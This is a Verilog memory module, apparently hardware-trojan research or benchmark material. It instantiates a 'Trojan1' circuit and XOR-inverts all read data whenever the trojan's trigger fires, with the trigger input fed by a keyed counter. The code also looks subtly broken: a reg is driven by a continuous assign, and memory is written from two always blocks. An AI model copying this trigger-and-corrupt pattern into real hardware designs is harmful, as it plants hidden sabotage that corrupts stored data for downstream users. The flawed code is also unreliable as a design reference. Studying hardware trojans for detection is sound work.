// Memory Host Circuit for Trojan1
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_memory_host #(
    parameter DATA_WIDTH = 16,    // Memory data width
    parameter ADDR_WIDTH = 6,     // Memory address width (64 locations)
    parameter [31:0] R1_KEY = 32'h5A5A5A5A  // R1 generation key
)(
    input wire clk,
    input wire rst,
    input wire [ADDR_WIDTH-1:0] address,
    input wire [DATA_WIDTH-1:0] write_data,
    input wire write_enable,
    input wire read_enable,
    output reg [DATA_WIDTH-1:0] read_data,
    output reg read_valid,
    output reg write_ack
);

    // Trojan interface (fixed width)
    reg trojan_r1;
    wire trojan_trigger;
    
    // Memory array
    reg [DATA_WIDTH-1:0] memory [0:(1<<ADDR_WIDTH)-1];
    reg [31:0] r1_counter;
    reg [4:0] r1_tap_pos;
    
    // R1 signal generation using counter-based pattern
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            r1_counter <= R1_KEY;
            r1_tap_pos <= 5'b0;
        end else if (read_enable || write_enable) begin
            r1_counter <= r1_counter + {16'b0, R1_KEY[15:0]};
            r1_tap_pos <= (r1_tap_pos == 5'h1F) ? 5'b0 : r1_tap_pos + 1;
        end
    end
    
    assign trojan_r1 = r1_counter[r1_tap_pos];
    
    // Memory write operation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            write_ack <= 1'b0;
        end else if (write_enable) begin
            memory[address] <= write_data;
            write_ack <= 1'b1;
        end else begin
            write_ack <= 1'b0;
        end
    end
    
    // Memory read operation with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            read_data <= {DATA_WIDTH{1'b0}};
            read_valid <= 1'b0;
        end else if (read_enable) begin
            // Mix read data with trojan trigger
            read_data <= memory[address] ^ (trojan_trigger ? {DATA_WIDTH{1'b1}} : {DATA_WIDTH{1'b0}});
            read_valid <= 1'b1;
        end else begin
            read_valid <= 1'b0;
        end
    end
    
    // Initialize memory
    integer i;
    always @(posedge rst) begin
        if (rst) begin
            for (i = 0; i < (1<<ADDR_WIDTH); i = i + 1) begin
                memory[i] <= {DATA_WIDTH{1'b0}};
            end
        end
    end
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

